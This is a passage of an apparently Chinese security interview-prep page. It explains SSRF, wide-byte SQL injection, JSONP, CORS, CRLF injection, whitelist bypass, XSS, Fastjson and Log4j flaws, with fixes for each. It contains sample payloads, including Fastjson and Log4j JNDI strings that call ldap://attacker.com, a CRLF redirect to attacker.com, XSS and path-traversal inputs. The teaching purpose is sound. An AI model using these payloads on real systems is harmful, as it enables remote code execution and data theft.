href="#漏洞原理：SSRF（Server-Side-Request-Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：-访问内网服务：通过构造请求访问内部服务，如-http-127-0-0-1-5000-admin，获取敏感信息。-探测元数据服务：访问云服务的元数据接口，如-AWS-的-http-169-254-169-254-latest-meta-data-，获取实例信息。-反弹-Shell：利用支持的协议（如-gopher）构造请求，反向连接攻击者主机，获取远程-shell。Java-和-PHP-的-SSRF-区别：-Java：HttpURLConnection、Apache-HttpClient-等类默认支持多种协议，可能被用于-SSRF-攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。-PHP：file-get-contents、cURL-等函数可用于发起请求，需注意协议限制。修复方案：-协议白名单：限制请求协议，仅允许-HTTP-和-HTTPS。-输入验证：严格验证用户输入的-URL，防止非法请求。-防火墙限制：使用防火墙规则限制对内部服务的访问。-云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。" class="headerlink" title="漏洞原理：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：- 访问内网服务：通过构造请求访问内部服务，如 http://127.0.0.1:5000/admin，获取敏感信息。- 探测元数据服务：访问云服务的元数据接口，如 AWS 的 http://169.254.169.254/latest/meta-data/，获取实例信息。- 反弹 Shell：利用支持的协议（如 gopher）构造请求，反向连接攻击者主机，获取远程 shell。Java 和 PHP 的 SSRF 区别：- Java：HttpURLConnection、Apache HttpClient 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。- PHP：file_get_contents、cURL 等函数可用于发起请求，需注意协议限制。修复方案：- 协议白名单：限制请求协议，仅允许 HTTP 和 HTTPS。- 输入验证：严格验证用户输入的 URL，防止非法请求。- 防火墙限制：使用防火墙规则限制对内部服务的访问。- 云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。"></a><strong>漏洞原理</strong>：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。<br><strong>利用方式</strong>：<br>- <strong>访问内网服务</strong>：通过构造请求访问内部服务，如 <code>http://127.0.0.1:5000/admin</code>，获取敏感信息。<br>- <strong>探测元数据服务</strong>：访问云服务的元数据接口，如 AWS 的 <code>http://169.254.169.254/latest/meta-data/</code>，获取实例信息。<br>- <strong>反弹 Shell</strong>：利用支持的协议（如 <code>gopher</code>）构造请求，反向连接攻击者主机，获取远程 shell。<br><strong>Java 和 PHP 的 SSRF 区别</strong>：<br>- <strong>Java</strong>：<code>HttpURLConnection</code>、<code>Apache HttpClient</code> 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。<br>- <strong>PHP</strong>：<code>file_get_contents</code>、<code>cURL</code> 等函数可用于发起请求，需注意协议限制。<br><strong>修复方案</strong>：<br>- <strong>协议白名单</strong>：限制请求协议，仅允许 HTTP 和 HTTPS。<br>- <strong>输入验证</strong>：严格验证用户输入的 URL，防止非法请求。<br>- <strong>防火墙限制</strong>：使用防火墙规则限制对内部服务的访问。<br>- <strong>云元数据防护</strong>：在云环境中，使用防火墙规则限制对元数据服务的访问。</h2><h3 id="宽字节注入漏洞原理、利用方式及修复方案？"><a href="#宽字节注入漏洞原理、利用方式及修复方案？" class="headerlink" title="宽字节注入漏洞原理、利用方式及修复方案？"></a>宽字节注入漏洞原理、利用方式及修复方案？</h3><h2 id="漏洞原理：宽字节注入利用多字节编码（如-GBK）特性，绕过单字节字符集的过滤，导致-SQL-注入。利用方式：-绕过过滤：在-GBK-编码下，-df-5c-27-被解析为-，绕过过滤器，导致-SQL-注入。修复方案：-统一编码：使用-UTF-8-编码，避免宽字节注入。-参数化查询：使用预编译语句，避免直接拼接-SQL。-输入验证：严格验证用户输入，防止恶意字符。"><a href="#漏洞原理：宽字节注入利用多字节编码（如-GBK）特性，绕过单字节字符集的过滤，导致-SQL-注入。利用方式：-绕过过滤：在-GBK-编码下，-df-5c-27-被解析为-，绕过过滤器，导致-SQL-注入。修复方案：-统一编码：使用-UTF-8-编码，避免宽字节注入。-参数化查询：使用预编译语句，避免直接拼接-SQL。-输入验证：严格验证用户输入，防止恶意字符。" class="headerlink" title="漏洞原理：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。利用方式：- 绕过过滤：在 GBK 编码下，%df%5c%27 被解析为 &#39;，绕过过滤器，导致 SQL 注入。修复方案：- 统一编码：使用 UTF-8 编码，避免宽字节注入。- 参数化查询：使用预编译语句，避免直接拼接 SQL。- 输入验证：严格验证用户输入，防止恶意字符。"></a><strong>漏洞原理</strong>：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。<br><strong>利用方式</strong>：<br>- <strong>绕过过滤</strong>：在 GBK 编码下，<code>%df%5c%27</code> 被解析为 <code>&#39;</code>，绕过过滤器，导致 SQL 注入。<br><strong>修复方案</strong>：<br>- <strong>统一编码</strong>：使用 UTF-8 编码，避免宽字节注入。<br>- <strong>参数化查询</strong>：使用预编译语句，避免直接拼接 SQL。<br>- <strong>输入验证</strong>：严格验证用户输入，防止恶意字符。</h2><h3 id="JSONP-的业务意义、JSONP-劫持利用方式及修复方案？如何设计-CSRF-Token？"><a href="#JSONP-的业务意义、JSONP-劫持利用方式及修复方案？如何设计-CSRF-Token？" class="headerlink" title="JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？"></a>JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？</h3><h2 id="JSONP-的业务意义：JSONP（JSON-with-Padding）是一种跨域请求数据的技术，利用-标签的跨域特性，允许网页从其他域获取数据。JSONP-劫持利用方式：-劫持敏感数据：攻击者构造恶意页面，利用-JSONP-获取用户敏感信息，如账户余额、个人资料等。修复方案：-禁用-JSONP：不使用-JSONP，改用-CORS-等安全的跨域请求方式。-验证回调函数：严格验证回调函数名，防止被篡改。-使用-HTTPS：通过-HTTPS-加密传输，防止中间人攻击。如何设计-CSRF-Token：-生成-Token：在服务器端生成随机的-CSRF-Token，并与用户会话关联。-嵌入-Token：在每个表单中嵌入该-Token，作为隐藏字段。-验证-Token：在服务器端验证请求中的-Token-是否与会话中的一致。-示例代码：-生成-Token（PHP）：-嵌入-Token（HTML）："><a href="#JSONP-的业务意义：JSONP（JSON-with-Padding）是一种跨域请求数据的技术，利用-标签的跨域特性，允许网页从其他域获取数据。JSONP-劫持利用方式：-劫持敏感数据：攻击者构造恶意页面，利用-JSONP-获取用户敏感信息，如账户余额、个人资料等。修复方案：-禁用-JSONP：不使用-JSONP，改用-CORS-等安全的跨域请求方式。-验证回调函数：严格验证回调函数名，防止被篡改。-使用-HTTPS：通过-HTTPS-加密传输，防止中间人攻击。如何设计-CSRF-Token：-生成-Token：在服务器端生成随机的-CSRF-Token，并与用户会话关联。-嵌入-Token：在每个表单中嵌入该-Token，作为隐藏字段。-验证-Token：在服务器端验证请求中的-Token-是否与会话中的一致。-示例代码：-生成-Token（PHP）：-嵌入-Token（HTML）：" class="headerlink" title="JSONP 的业务意义：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 &lt;script&gt; 标签的跨域特性，允许网页从其他域获取数据。JSONP 劫持利用方式：- 劫持敏感数据：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。修复方案：- 禁用 JSONP：不使用 JSONP，改用 CORS 等安全的跨域请求方式。- 验证回调函数：严格验证回调函数名，防止被篡改。- 使用 HTTPS：通过 HTTPS 加密传输，防止中间人攻击。如何设计 CSRF Token：- 生成 Token：在服务器端生成随机的 CSRF Token，并与用户会话关联。- 嵌入 Token：在每个表单中嵌入该 Token，作为隐藏字段。- 验证 Token：在服务器端验证请求中的 Token 是否与会话中的一致。- 示例代码：  - 生成 Token（PHP）：      - 嵌入 Token（HTML）：    "></a><strong>JSONP 的业务意义</strong>：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 <code>&lt;script&gt;</code> 标签的跨域特性，允许网页从其他域获取数据。<br><strong>JSONP 劫持利用方式</strong>：<br>- <strong>劫持敏感数据</strong>：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。<br><strong>修复方案</strong>：<br>- <strong>禁用 JSONP</strong>：不使用 JSONP，改用 CORS 等安全的跨域请求方式。<br>- <strong>验证回调函数</strong>：严格验证回调函数名，防止被篡改。<br>- <strong>使用 HTTPS</strong>：通过 HTTPS 加密传输，防止中间人攻击。<br><strong>如何设计 CSRF Token</strong>：<br>- <strong>生成 Token</strong>：在服务器端生成随机的 CSRF Token，并与用户会话关联。<br>- <strong>嵌入 Token</strong>：在每个表单中嵌入该 Token，作为隐藏字段。<br>- <strong>验证 Token</strong>：在服务器端验证请求中的 Token 是否与会话中的一致。<br>- <strong>示例代码</strong>：<br>  - <strong>生成 Token</strong>（PHP）：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  - <strong>嵌入 Token</strong>（HTML）：<br>    <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;csrf_token&#x27;]; ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他表单字段 --&gt;</span></span><br><span class="line">&lt;/form </span><br></pre></td></tr></table></figure></h2><h3 id="CORS-原理、利用及修复？"><a href="#CORS-原理、利用及修复？" class="headerlink" title="CORS 原理、利用及修复？"></a><strong>CORS 原理、利用及修复？</strong></h3><h2 id="CORS-原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了-Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的-CORS-漏洞，窃取敏感数据。例如：-攻击者站点通过-请求目标站点，若目标站点未正确配置-CORS，攻击者可窃取数据。修复方案：-配置严格的-CORS-策略：只允许特定的来源域名访问资源：-使用预检请求：启用-OPTIONS-请求，确保请求的安全性。"><a href="#CORS-原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了-Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的-CORS-漏洞，窃取敏感数据。例如：-攻击者站点通过-请求目标站点，若目标站点未正确配置-CORS，攻击者可窃取数据。修复方案：-配置严格的-CORS-策略：只允许特定的来源域名访问资源：-使用预检请求：启用-OPTIONS-请求，确保请求的安全性。" class="headerlink" title="CORS 原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：- 攻击者站点通过 &lt;script src=&quot;http://target.com/sensitive-data&quot;&gt; 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。修复方案：- 配置严格的 CORS 策略：只允许特定的来源域名访问资源：  - 使用预检请求：启用 OPTIONS 请求，确保请求的安全性。"></a><strong>CORS 原理</strong>：<br>跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 <code>Access-Control-Allow-Origin</code>，指定哪些域名可以访问该资源。<br><strong>利用方式</strong>：<br>攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：<br>- 攻击者站点通过 <code>&lt;script src=&quot;http://target.com/sensitive-data&quot;&gt;</code> 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。<br><strong>修复方案</strong>：<br>- <strong>配置严格的 CORS 策略</strong>：只允许特定的来源域名访问资源：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted-site.com</span><br></pre></td></tr></table></figure><br>- <strong>使用预检请求</strong>：启用 <code>OPTIONS</code> 请求，确保请求的安全性。</h2><h3 id="CRLF-注入原理？"><a href="#CRLF-注入原理？" class="headerlink" title="CRLF 注入原理？"></a><strong>CRLF 注入原理？</strong></h3><h2 id="漏洞原理：CRLF（Carriage-Return-Line-Feed）注入漏洞发生在攻击者向-HTTP-响应中插入非法的换行符-r-n，以破坏服务器对响应的处理，从而影响-HTTP-头的解析。攻击者可以插入恶意内容，如注入-HTTP-响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：-HTTP-头注入：攻击者可以通过-CRLF-注入，在响应中插入额外的头部，例如重定向：-修复方案：-输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。-HTTP-头规范化：确保所有-HTTP-头遵循标准格式，避免不必要的字符插入。"><a href="#漏洞原理：CRLF（Carriage-Return-Line-Feed）注入漏洞发生在攻击者向-HTTP-响应中插入非法的换行符-r-n，以破坏服务器对响应的处理，从而影响-HTTP-头的解析。攻击者可以插入恶意内容，如注入-HTTP-响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：-HTTP-头注入：攻击者可以通过-CRLF-注入，在响应中插入额外的头部，例如重定向：-修复方案：-输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。-HTTP-头规范化：确保所有-HTTP-头遵循标准格式，避免不必要的字符插入。" class="headerlink" title="漏洞原理：CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 \r\n，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：- HTTP 头注入：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：  修复方案：- 输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。- HTTP 头规范化：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。"></a><strong>漏洞原理</strong>：<br>CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 <code>\r\n</code>，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。<br><strong>利用方式</strong>：<br>- <strong>HTTP 头注入</strong>：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionid=malicious_value; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://attacker.com/malicious</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>输入验证</strong>：过滤所有输入，防止用户提交非法的换行符或回车符。<br>- <strong>HTTP 头规范化</strong>：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。</h2><h3 id="URL-白名单如何绕过？"><a href="#URL-白名单如何绕过？" class="headerlink" title="URL 白名单如何绕过？"></a><strong>URL 白名单如何绕过？</strong></h3><h2 id="漏洞原理：URL-白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：-使用-URL-编码：如-http-example-com-2F-2E-2E-2F（通过-URL-编码绕过路径限制）。-使用-localhost-或-127-0-0-1-地址直接访问内网服务。利用方式：-路径绕过：攻击者通过-URL-编码或使用-DNS-重绑定，绕过域名限制：-修复方案：-严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。-DNS-检查：验证-URL-的-DNS-解析结果，确保目标地址的-IP-属于可信范围。"><a href="#漏洞原理：URL-白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：-使用-URL-编码：如-http-example-com-2F-2E-2E-2F（通过-URL-编码绕过路径限制）。-使用-localhost-或-127-0-0-1-地址直接访问内网服务。利用方式：-路径绕过：攻击者通过-URL-编码或使用-DNS-重绑定，绕过域名限制：-修复方案：-严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。-DNS-检查：验证-URL-的-DNS-解析结果，确保目标地址的-IP-属于可信范围。" class="headerlink" title="漏洞原理：URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：- 使用 URL 编码：如 http://example.com%2F%2E%2E%2F（通过 URL 编码绕过路径限制）。- 使用 localhost 或 127.0.0.1 地址直接访问内网服务。利用方式：- 路径绕过：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：  修复方案：- 严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。- DNS 检查：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。"></a><strong>漏洞原理</strong>：<br>URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：<br>- 使用 URL 编码：如 <code>http://example.com%2F%2E%2E%2F</code>（通过 URL 编码绕过路径限制）。<br>- 使用 <code>localhost</code> 或 <code>127.0.0.1</code> 地址直接访问内网服务。<br><strong>利用方式</strong>：<br>- <strong>路径绕过</strong>：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://trusted-site.com/../../etc/passwd</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>严格白名单规则</strong>：验证请求的域名和路径，确保只允许明确的合法地址。<br>- <strong>DNS 检查</strong>：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。</h2><h3 id="XSS-如何实现？"><a href="#XSS-如何实现？" class="headerlink" title="XSS 如何实现？"></a><strong>XSS 如何实现？</strong></h3><h2 id="漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL-参数等位置注入-JavaScript-代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：-存储型-XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：-反射型-XSS：攻击者通过-URL-注入恶意脚本，用户点击后触发：-修复方案：-输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：-内容安全策略（CSP）：使用-Content-Security-Policy-响应头，限制可执行的脚本来源："><a href="#漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL-参数等位置注入-JavaScript-代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：-存储型-XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：-反射型-XSS：攻击者通过-URL-注入恶意脚本，用户点击后触发：-修复方案：-输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：-内容安全策略（CSP）：使用-Content-Security-Policy-响应头，限制可执行的脚本来源：" class="headerlink" title="漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：- 存储型 XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：  - 反射型 XSS：攻击者通过 URL 注入恶意脚本，用户点击后触发：  修复方案：- 输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：  - 内容安全策略（CSP）：使用 Content-Security-Policy 响应头，限制可执行的脚本来源：  "></a><strong>漏洞原理</strong>：<br>跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。<br><strong>利用方式</strong>：<br>- <strong>存储型 XSS</strong>：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：<br>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>- <strong>反射型 XSS</strong>：攻击者通过 URL 注入恶意脚本，用户点击后触发：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>输入输出编码</strong>：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br></pre></td></tr></table></figure><br>- <strong>内容安全策略（CSP）</strong>：使用 <code>Content-Security-Policy</code> 响应头，限制可执行的脚本来源：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src &#x27;self&#x27; https://trusted-cdn.com;</span><br></pre></td></tr></table></figure></h2><h3 id="Fastjson、Log4j-常见漏洞原理？如何底层解决该漏洞？"><a href="#Fastjson、Log4j-常见漏洞原理？如何底层解决该漏洞？" class="headerlink" title="Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？"></a><strong>Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？</strong></h3><h2 id="Fastjson-漏洞原理：Fastjson-是一个-JSON-处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意-JSON-数据，利用-Fastjson-的自动类型转换功能，执行任意代码。此漏洞被称为-AutoType-漏洞。利用方式：-反序列化攻击：攻击者利用-Fastjson-的-AutoType-特性，发送恶意-JSON-数据，触发反序列化漏洞，从而执行恶意代码。-修复方案：-禁用-AutoType：禁用不必要的类型转换，避免反序列化恶意类型：-Log4j-漏洞原理：Log4j-是一款流行的-Java-日志框架，曾因-JNDI-查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过-JNDI-远程加载恶意类，从而执行代码。利用方式：-JNDI-注入：攻击者发送恶意日志数据，触发-Log4j-向远程-JNDI-服务加载恶意类：-修复方案：-更新-Log4j-版本：立即升级到-Log4j-2-16-0-或更高版本，禁用-JNDI-查找功能。-禁用-JNDI：通过配置-Log4j-禁用-JNDI-查找："><a href="#Fastjson-漏洞原理：Fastjson-是一个-JSON-处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意-JSON-数据，利用-Fastjson-的自动类型转换功能，执行任意代码。此漏洞被称为-AutoType-漏洞。利用方式：-反序列化攻击：攻击者利用-Fastjson-的-AutoType-特性，发送恶意-JSON-数据，触发反序列化漏洞，从而执行恶意代码。-修复方案：-禁用-AutoType：禁用不必要的类型转换，避免反序列化恶意类型：-Log4j-漏洞原理：Log4j-是一款流行的-Java-日志框架，曾因-JNDI-查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过-JNDI-远程加载恶意类，从而执行代码。利用方式：-JNDI-注入：攻击者发送恶意日志数据，触发-Log4j-向远程-JNDI-服务加载恶意类：-修复方案：-更新-Log4j-版本：立即升级到-Log4j-2-16-0-或更高版本，禁用-JNDI-查找功能。-禁用-JNDI：通过配置-Log4j-禁用-JNDI-查找：" class="headerlink" title="Fastjson 漏洞原理：Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 AutoType 漏洞。利用方式：- 反序列化攻击：攻击者利用 Fastjson 的 AutoType 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。  修复方案：- 禁用 AutoType：禁用不必要的类型转换，避免反序列化恶意类型：  Log4j 漏洞原理：Log4j 是一款流行的 Java 日志框架，曾因 JNDI 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。利用方式：- JNDI 注入：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：  修复方案：- 更新 Log4j 版本：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。- 禁用 JNDI：通过配置 Log4j 禁用 JNDI 查找：  "></a><strong>Fastjson 漏洞原理</strong>：<br>Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 <code>AutoType</code> 漏洞。<br><strong>利用方式</strong>：<br>- <strong>反序列化攻击</strong>：攻击者利用 Fastjson 的 <code>AutoType</code> 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。<br>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker.com/malicious&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>禁用 AutoType</strong>：禁用不必要的类型转换，避免反序列化恶意类型：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><strong>Log4j 漏洞原理</strong>：<br>Log4j 是一款流行的 Java 日志框架，曾因 <code>JNDI</code> 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。<br><strong>利用方式</strong>：<br>- <strong>JNDI 注入</strong>：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：<br>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://attacker.com/malicious&#125;</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>更新 Log4j 版本</strong>：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。<br>- <strong>禁用 JNDI</strong>：通过配置 Log4j 禁用 JNDI 查找：<br>  <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j2.formatMsgNoLookups</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure></h2><h3 id="业务逻辑漏洞具体类型："><a href="#业务逻辑漏洞具体类型：" class="headerlink" title="业务逻辑漏洞具体类型："></a>业务逻辑漏洞具体类型：</h3><ul><li>身份校验相关风险：未授权访问、非正常账户状态、身份可枚举、水平越权、垂直越权等。</li><li>接口逻辑实现不一致：不同协议实现不一致、同类产品不同逻辑、不同阶段逻辑不一致-流程绕过。</li><li>不安全的可信端数据：APP数据被篡改或伪造。</li><li>预设要求不符合：依赖条件不安全-业务校验属性设计、人工客服容易被骗-业务流程设计。</li><li>滥用合理业务需求：如API速率限制被绕过、促销活动被恶意利用等。</li></ul><hr><h3 id="哪些账户状态会导致预期外的风险："><a href="#哪些账户状态会导致预期外的风险：" class="headerlink" 